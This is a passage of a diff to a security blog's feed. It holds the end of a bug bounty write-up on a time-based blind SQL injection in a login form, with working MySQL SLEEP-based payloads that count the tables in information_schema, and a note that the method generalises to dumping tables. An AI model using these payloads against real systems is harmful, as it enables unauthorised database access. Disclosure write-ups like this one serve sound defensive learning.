-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;select+count(*)+from+information_schema.tables
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;returns the number of tables in the database.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;The following SQL code&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;(select+count(*)+from+information_schema.tables)=341
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;compares the number of tables in the database with the number 341.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;The following SQL code&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;produces a delay of 5 seconds if the number of tables is 341 and returns the string “NO” otherwise.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;The above payload needs to be embedded into a SQL query so the following SQL code&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;code-header&quot;&gt;
-  &lt;button class=&quot;copy-code-button&quot;&gt;
-    Copy
-  &lt;/button&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;(SELECT+IF((select+count(*)+from+information_schema.tables)=341,SLEEP(0.05),&quot;NO&quot;))=1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;is SQL query that executes the IF function inside a comparison statement in a select clause.&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;As you can see in the previous screenshot, the request produces a delay of approximately 5 seconds (5822 miliseconds) so the number of tables in the database is 341. I sent the request to the intruder varying the value from 1 to 500 and the only request that produced a delay was the request with the value 341.&lt;/p&gt;
-
-&lt;p&gt;As you have just seen, it is possible to get information from the database through a time-based SQL injection. This process can be generalized to obtain table names, attributes… character by character, in order to make queries to the really important tables and finally dump all the tables that can be accessed by the user executing the query.&lt;/p&gt;
-
-&lt;p&gt;However, it is not an easy process and although there are tools such as Sqlmap that execute the process automatically, it is not necessary to run this type of tools in a bug bounty program to &lt;strong&gt;exploit&lt;/strong&gt; a SQL injection because you can get the bounty just by attaching a simple poc that you can get information from the database. That is why I attached a very simple PoC obtaining only the number of tables in the database.&lt;/p&gt;
-
-&lt;p&gt;Nevertheless, Sqlmap can be a good tool to &lt;strong&gt;detect&lt;/strong&gt; SQL injections because this tool tests several payloads to automatically detect and classify the possible SQL injections present, and this process is not as noisy and aggressive as the one used to exploit them.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-4&quot; /&gt;
-
-&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;
-
-&lt;p&gt;The asset didn’t have a related domain name but it was an important asset of the company, that is why it was a closed registration website. SQL injection is usually considered a vulnerability of critical severity, especially in this case that I provided a PoC of how this injection could be used to get information from the database. Therefore, the report was classified as&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: High&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: Critical&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $900&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;and I won the highest bounty of the program.&lt;/p&gt;
-
-&lt;div id=&quot;section-id-5&quot; /&gt;
-
-&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;The reconnaisance step it’s very important, probably the most important one. It’s not a lost of time to use different OSINT tools, like LeakIX.&lt;/li&gt;
-  &lt;li&gt;Low severity vulnerabilities should not be underestimated. Some of them, such as PHP info page disclosure, can lead to dangerous situations or make other vulnerabilities more critical.&lt;/li&gt;
-  &lt;li&gt;Blind vulnerabilities, such as blind SQL injection, blind RCE… can be just as dangerous as non-blind vulnerabilities. Although it is not possible to obtain information directly from the response, it can be inferred through various techniques, such as producing delays based on a boolean condition.&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="bug bounty" /><category term="web" /><category term="osint" /><category term="leakix" /><category term="portswigger" /><category term="burpsuite" /><category term="sql injection" /><category term="mysql" /><category term="information_schema" /><category term="sqlmap" /><category term="php info page" /><summary type="html">Partial disclosure of a bug bounty report: time-based SQL injection in login form.</summary></entry></feed>
+&lt;/ul&gt;</content><author><name>Iván Santos Malpica&lt;br&gt;(Aka. HackCommander)</name><email>ivansantosmalpica.contact@gmail.com</email></author><category term="pentesting article" /><category term="web" /><category term="burpsuite" /><category term="base64" /><category term="metasploitable 2" /><category term="xss" /><category term="exfiltrate cookies" /><category term="session hijacking" /><category term="php info page" /><category term="bypass" /><summary type="html">Pentesting article: how to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation.</summary></entry></feed>
